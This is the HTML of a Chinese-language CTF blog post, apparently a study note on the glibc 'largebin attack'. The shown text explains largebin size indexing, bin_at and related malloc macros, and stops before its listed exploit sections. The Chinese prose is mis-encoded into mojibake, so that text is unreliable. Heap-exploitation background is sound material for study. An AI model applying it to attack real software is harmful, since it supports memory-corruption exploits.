<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Largebin-attackæ€»ç»“ | ScUpax0s</title><meta name="description" content="Largebin attackæ€»ç»“å’•å’•å’•å¥½å‡ å¤©çš„largebin attackæ¥åŠ› largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ å½“chunkè¢«æ’å…¥unsortedbinçš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬å†å»ç”³è¯·ï¼Œæ­¤æ—¶ä»unsortedbinæœ«å°¾å¼€å§‹éå†ï¼Œå€˜è‹¥éå†åˆ°çš„ä¸ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚å¤§å°ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šåšsortedâ€”â€”é‡æ–°æŠŠè¿™ä¸ªchunkæ”¾å…¥smallbinæˆ–è€…largebin  1234567#define in_smallbin"><meta name="keywords" content="largebin"><meta name="author" content="Paxos"><meta name="copyright" content="Paxos"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Largebin-attackæ€»ç»“"><meta name="twitter:description" content="Largebin attackæ€»ç»“å’•å’•å’•å¥½å‡ å¤©çš„largebin attackæ¥åŠ› largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ å½“chunkè¢«æ’å…¥unsortedbinçš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬å†å»ç”³è¯·ï¼Œæ­¤æ—¶ä»unsortedbinæœ«å°¾å¼€å§‹éå†ï¼Œå€˜è‹¥éå†åˆ°çš„ä¸ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚å¤§å°ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šåšsortedâ€”â€”é‡æ–°æŠŠè¿™ä¸ªchunkæ”¾å…¥smallbinæˆ–è€…largebin  1234567#define in_smallbin"><meta name="twitter:image" content="https://s1.ax1x.com/2020/08/31/dOgQ4x.jpg"><meta property="og:type" content="article"><meta property="og:title" content="Largebin-attackæ€»ç»“"><meta property="og:url" content="http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/"><meta property="og:site_name" content="ScUpax0s"><meta property="og:description" content="Largebin attackæ€»ç»“å’•å’•å’•å¥½å‡ å¤©çš„largebin attackæ¥åŠ› largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ å½“chunkè¢«æ’å…¥unsortedbinçš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬å†å»ç”³è¯·ï¼Œæ­¤æ—¶ä»unsortedbinæœ«å°¾å¼€å§‹éå†ï¼Œå€˜è‹¥éå†åˆ°çš„ä¸ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚å¤§å°ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šåšsortedâ€”â€”é‡æ–°æŠŠè¿™ä¸ªchunkæ”¾å…¥smallbinæˆ–è€…largebin  1234567#define in_smallbin"><meta property="og:image" content="https://s1.ax1x.com/2020/08/31/dOgQ4x.jpg"><meta property="article:published_time" content="2020-08-31T08:07:52.000Z"><meta property="article:modified_time" content="2020-08-31T08:24:52.550Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/"><link rel="prev" title="bctf2018_baby_arenaï¼ˆFSOP+global_max_fastï¼‰" href="http://yoursite.com/2020/09/02/bctf2018-baby-arena%EF%BC%88FSOP-global-max-fast%EF%BC%89/"><link rel="next" title="ciscnCTF2020-pwn" href="http://yoursite.com/2020/08/21/ciscnCTF2020-pwn/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç°¡"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://s1.ax1x.com/2020/06/15/N9ZTBV.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">63</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">34</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-diamond" aria-hidden="true"></i><span> Life</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> talk</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Largebin-attackæ€»ç»“"><span class="toc-number">1.</span> <span class="toc-text">Largebin attackæ€»ç»“</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ"><span class="toc-number">1.1.</span> <span class="toc-text">largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#æºç åˆ†æ"><span class="toc-number">1.2.</span> <span class="toc-text">æºç åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#å®define-builtin-expect"><span class="toc-number">1.2.1.</span> <span class="toc-text">å®define __builtin_expect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å®bin-at"><span class="toc-number">1.2.2.</span> <span class="toc-text">å®bin_at</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å®mark-bin"><span class="toc-number">1.2.3.</span> <span class="toc-text">å®mark_bin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bitmap"><span class="toc-number">1.2.4.</span> <span class="toc-text">bitmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebinçš„æ’å…¥ç›¸å…³æ“ä½œ"><span class="toc-number">1.2.5.</span> <span class="toc-text">largebinçš„æ’å…¥ç›¸å…³æ“ä½œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebinçš„å–å‡ºç›¸å…³æ“ä½œ"><span class="toc-number">1.2.6.</span> <span class="toc-text">largebinçš„å–å‡ºç›¸å…³æ“ä½œ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ä¼ªé€ Largebinçš„bk-nextsizeï¼ˆå–å‡ºæ—¶ï¼‰"><span class="toc-number">1.3.</span> <span class="toc-text">ä¼ªé€ Largebinçš„bk_nextsizeï¼ˆå–å‡ºæ—¶ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ä¼ªé€ largebinçš„bk-nextsizeä»¥åŠbkï¼ˆæ’å…¥largebinæ—¶ï¼‰"><span class="toc-number">1.4.</span> <span class="toc-text">ä¼ªé€ largebinçš„bk_nextsizeä»¥åŠbkï¼ˆæ’å…¥largebinæ—¶ï¼‰</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ä¾‹é¢˜1ï¼š0ctf-2018-heapstorm2ï¼ˆæ’å…¥æ—¶æ”»å‡»ï¼‰"><span class="toc-number">2.</span> <span class="toc-text">ä¾‹é¢˜1ï¼š0ctf_2018_heapstorm2ï¼ˆæ’å…¥æ—¶æ”»å‡»ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#é¢˜ç›®æ¦‚è§ˆ"><span class="toc-number">2.1.</span> <span class="toc-text">é¢˜ç›®æ¦‚è§ˆ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#æ”»å‡»è¿‡ç¨‹"><span class="toc-number">2.2.</span> <span class="toc-text">æ”»å‡»è¿‡ç¨‹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ä¾‹é¢˜2ï¼šLCTF2017-2ez4u-å–å‡ºæ—¶æ”»å‡»"><span class="toc-number">3.</span> <span class="toc-text">ä¾‹é¢˜2ï¼šLCTF2017-2ez4u(å–å‡ºæ—¶æ”»å‡»)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#é¢˜ç›®æ¦‚è§ˆ-1"><span class="toc-number">3.1.</span> <span class="toc-text">é¢˜ç›®æ¦‚è§ˆ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#æ”»å‡»è¿‡ç¨‹-1"><span class="toc-number">3.2.</span> <span class="toc-text">æ”»å‡»è¿‡ç¨‹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ç•ªå¤–ç¯‡â€”â€”å…³äºfastbinçš„åˆå¹¶"><span class="toc-number">4.</span> <span class="toc-text">ç•ªå¤–ç¯‡â€”â€”å…³äºfastbinçš„åˆå¹¶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#åˆå¹¶æ—¶æœº"><span class="toc-number">4.1.</span> <span class="toc-text">åˆå¹¶æ—¶æœº</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#åœ¨ç”³è¯·large-chunkæ—¶"><span class="toc-number">4.1.1.</span> <span class="toc-text">åœ¨ç”³è¯·large chunkæ—¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å½“ç”³è¯·çš„chunkéœ€è¦ç”³è¯·æ–°çš„top-chunkæ—¶"><span class="toc-number">4.1.2.</span> <span class="toc-text">å½“ç”³è¯·çš„chunkéœ€è¦ç”³è¯·æ–°çš„top chunkæ—¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freeçš„å †å—å¤§å°å¤§äºfastbinä¸­çš„æœ€å¤§sizeã€‚ï¼ˆæ³¨æ„è¿™é‡Œå¹¶ä¸æ˜¯æŒ‡å½“å‰fastbinä¸­æœ€å¤§chunkçš„sizeï¼Œè€Œæ˜¯æŒ‡fastbinä¸­æ‰€å®šä¹‰çš„æœ€å¤§chunkçš„sizeï¼Œæ˜¯ä¸€ä¸ªå›ºå®šå€¼ã€‚ï¼‰"><span class="toc-number">4.1.3.</span> <span class="toc-text">freeçš„å †å—å¤§å°å¤§äºfastbinä¸­çš„æœ€å¤§sizeã€‚ï¼ˆæ³¨æ„è¿™é‡Œå¹¶ä¸æ˜¯æŒ‡å½“å‰fastbinä¸­æœ€å¤§chunkçš„sizeï¼Œè€Œæ˜¯æŒ‡fastbinä¸­æ‰€å®šä¹‰çš„æœ€å¤§chunkçš„sizeï¼Œæ˜¯ä¸€ä¸ªå›ºå®šå€¼ã€‚ï¼‰</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#åˆå¹¶è¿‡ç¨‹"><span class="toc-number">4.2.</span> <span class="toc-text">åˆå¹¶è¿‡ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-consolidateæ—¢å¯ä»¥ä½œä¸ºfastbinçš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºfastbinçš„åˆå¹¶å‡½æ•°ã€‚"><span class="toc-number">4.2.1.</span> <span class="toc-text">malloc_consolidateæ—¢å¯ä»¥ä½œä¸ºfastbinçš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºfastbinçš„åˆå¹¶å‡½æ•°ã€‚</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#å‚è€ƒ"><span class="toc-number">5.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://s1.ax1x.com/2020/08/31/dOgQ4x.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">ScUpax0s</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-diamond" aria-hidden="true"></i><span> Life</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> talk</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">Largebin-attackæ€»ç»“</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2020-08-31 16:07:52"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2020-08-31</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-08-31 16:24:52"><i class="fa fa-history" aria-hidden="true"></i> Updated 2020-08-31</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%F0%9F%93%92/">å­¦ä¹ ç¬”è®°ğŸ“’</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>Comments:</span><span class="disqus-comment-count comment-count"><a href="http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/#disqus_thread"></a></span></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="Largebin-attackæ€»ç»“"><a href="#Largebin-attackæ€»ç»“" class="headerlink" title="Largebin attackæ€»ç»“"></a>Largebin attackæ€»ç»“</h1><p>å’•å’•å’•å¥½å‡ å¤©çš„largebin attackæ¥åŠ›</p>
<h2 id="largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ"><a href="#largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ" class="headerlink" title="largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ"></a>largebinç®¡ç†æ€æƒ³æ¦‚è§ˆ</h2><ul>
<li>å½“chunkè¢«æ’å…¥unsortedbinçš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬å†å»ç”³è¯·ï¼Œæ­¤æ—¶ä»unsortedbinæœ«å°¾å¼€å§‹éå†ï¼Œå€˜è‹¥éå†åˆ°çš„ä¸ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚å¤§å°ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šåšsortedâ€”â€”é‡æ–°æŠŠè¿™ä¸ªchunkæ”¾å…¥smallbinæˆ–è€…largebin</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  </span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>64ä½ç³»ç»Ÿä¸­å¤§äº0x400çš„ä¸ºlargebinèŒƒå›´ï¼Œ32ä½å¤§äº0x200ï¼ˆä¸å¸¦tcacheï¼‰</li>
<li>fd_nextsizeæŒ‡å‘æ¯”ä»–å°çš„æœ€å¤§çš„chunkï¼Œbk_nextsizeæŒ‡å‘æ¯”ä»–å¤§çš„æœ€å°çš„chunkï¼ˆä¸åŒç´¢å¼•çš„largebinï¼‰ï¼Œå¹¶ä¸”æ˜¯é¦–ä½å¾ªç¯è¿æ¥ã€‚</li>
<li>largebinä¸­ä¸åªæœ‰ä¸€æ¡é“¾ï¼Œæœ‰ã€å¤æ‚</li>
<li>largebinä¸­sizeä¸indexçš„å¯¹åº”å¦‚ä¸‹ï¼š</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">size</span>	index</span><br><span class="line">[<span class="number">0x400</span> , <span class="number">0x440</span>)	<span class="number">64</span></span><br><span class="line">[<span class="number">0x440</span> , <span class="number">0x480</span>)	<span class="number">65</span></span><br><span class="line">[<span class="number">0x480</span> , <span class="number">0x4C0</span>)	<span class="number">66</span></span><br><span class="line">[<span class="number">0x4C0</span> , <span class="number">0x500</span>)	<span class="number">67</span></span><br><span class="line">[<span class="number">0x500</span> , <span class="number">0x540</span>)	<span class="number">68</span></span><br><span class="line">ç­‰å·® <span class="number">0x40</span>	â€¦</span><br><span class="line">[<span class="number">0xC00</span> , <span class="number">0xC40</span>)	<span class="number">96</span></span><br><span class="line">[<span class="number">0xC40</span> , <span class="number">0xE00</span>)	<span class="number">97</span></span><br><span class="line">[<span class="number">0xE00</span> , <span class="number">0x1000</span>)	<span class="number">98</span></span><br><span class="line">[<span class="number">0x1000</span> , <span class="number">0x1200</span>)	<span class="number">99</span></span><br><span class="line">[<span class="number">0x1200</span> , <span class="number">0x1400</span>)	<span class="number">100</span></span><br><span class="line">[<span class="number">0x1400</span> , <span class="number">0x1600</span>)	<span class="number">101</span></span><br><span class="line">ç­‰å·® <span class="number">0x200</span>	â€¦</span><br><span class="line">[<span class="number">0x2800</span> , <span class="number">0x2A00</span>)	<span class="number">111</span></span><br><span class="line">[<span class="number">0x2A00</span> , <span class="number">0x3000</span>)	<span class="number">112</span></span><br><span class="line">[<span class="number">0x3000</span> , <span class="number">0x4000</span>)	<span class="number">113</span></span><br><span class="line">[<span class="number">0x4000</span> , <span class="number">0x5000</span>)	<span class="number">114</span></span><br><span class="line">ç­‰å·® <span class="number">0x1000</span>	â€¦</span><br><span class="line">[<span class="number">0x9000</span> , <span class="number">0xA000</span>)	<span class="number">119</span></span><br><span class="line">[<span class="number">0xA000</span> , <span class="number">0x10000</span>)	<span class="number">120</span></span><br><span class="line">[<span class="number">0x10000</span> , <span class="number">0x18000</span>)	<span class="number">121</span></span><br><span class="line">[<span class="number">0x18000</span> , <span class="number">0x20000</span>)	<span class="number">122</span></span><br><span class="line">[<span class="number">0x20000</span> , <span class="number">0x28000</span>)	<span class="number">123</span></span><br><span class="line">[<span class="number">0x28000</span> , <span class="number">0x40000</span>)	<span class="number">124</span></span><br><span class="line">[<span class="number">0x40000</span> , <span class="number">0x80000</span>)	<span class="number">125</span></span><br><span class="line">[<span class="number">0x80000</span> , â€¦. )	<span class="number">126</span></span><br></pre></td></tr></table></figure>

<p>largebinç®¡ç†çš„æ˜¯ä¸€ä¸ªèŒƒå›´åŒºé—´çš„å †å—ï¼Œæ­¤æ—¶<code>fd_nextsize</code>ä¸<code>bk_nextsize</code>å°±æ´¾ä¸Šäº†ç”¨åœºã€‚</p>
<p>å¤§å°å¯¹åº”ç›¸åŒindexä¸­çš„å †å—ï¼Œå…¶åœ¨é“¾è¡¨ä¸­çš„æ’åºæ–¹å¼ä¸ºï¼š</p>
<ul>
<li>å †å—ä»å¤§åˆ°å°æ’åºã€‚</li>
<li>å¯¹äºç›¸åŒå¤§å°çš„å †å—ï¼Œæœ€å…ˆé‡Šæ”¾çš„å †å—ä¼šæˆä¸ºå †å¤´ï¼Œå…¶<code>fd_nextsize</code>ä¸<code>bk_nextsize</code>ä¼šè¢«èµ‹å€¼ï¼Œå…¶ä½™çš„å †å—é‡Šæ”¾åéƒ½ä¼šæ’å…¥åˆ°è¯¥å †å¤´ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªç»“ç‚¹ï¼Œé€šè¿‡<code>fd</code>ä¸<code>bk</code>é“¾æ¥ï¼Œå½¢æˆäº†å…ˆé‡Šæ”¾çš„åœ¨é“¾è¡¨åé¢çš„æ’åºæ–¹å¼ï¼Œä¸”å…¶<code>fd_nextsize</code>ä¸<code>bk_nextsize</code>éƒ½ä¸º0ã€‚</li>
<li>ä¸åŒå¤§å°çš„å †å—é€šè¿‡å †å¤´ä¸²è”ï¼Œå³å †å¤´ä¸­<code>fd_nextsize</code>æŒ‡å‘æ¯”å®ƒå°çš„å †å—çš„å †å¤´ï¼Œ<code>bk_nextsize</code>æŒ‡å‘æ¯”å®ƒå¤§çš„å †å—çš„å †å¤´ï¼Œä»è€Œå½¢æˆäº†ç¬¬ä¸€ç‚¹ä¸­çš„ä»å¤§åˆ°å°æ’åºå †å—çš„æ–¹å¼ã€‚åŒæ—¶æœ€å¤§çš„å †å—çš„å †å¤´çš„<code>bk_nextsize</code>æŒ‡å‘æœ€å°çš„å †å—çš„å †å¤´ï¼Œæœ€å°å †å—çš„å †å¤´çš„<code>fd_nextsize</code>æŒ‡å‘æœ€å¤§å †å—çš„å †å¤´ï¼Œä»¥æ­¤å½¢æˆå¾ªç¯åŒé“¾è¡¨ã€‚</li>
</ul>
<h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><h3 id="å®define-builtin-expect"><a href="#å®define-builtin-expect" class="headerlink" title="å®define __builtin_expect"></a>å®define __builtin_expect</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br></pre></td></tr></table></figure>

<p>è²Œä¼¼å°±æ˜¯å–exprè¡¨è¾¾å¼çš„å€¼ã€‚</p>
<h3 id="å®bin-at"><a href="#å®bin-at" class="headerlink" title="å®bin_at"></a>å®bin_at</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))               \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure>

<p><strong>å® bin_at(m, i) é€šè¿‡ bin index è·å¾— bin çš„é“¾è¡¨å¤´</strong>ï¼Œm æŒ‡çš„æ˜¯åˆ†é…åŒºï¼Œi æ˜¯ç´¢å¼•</p>
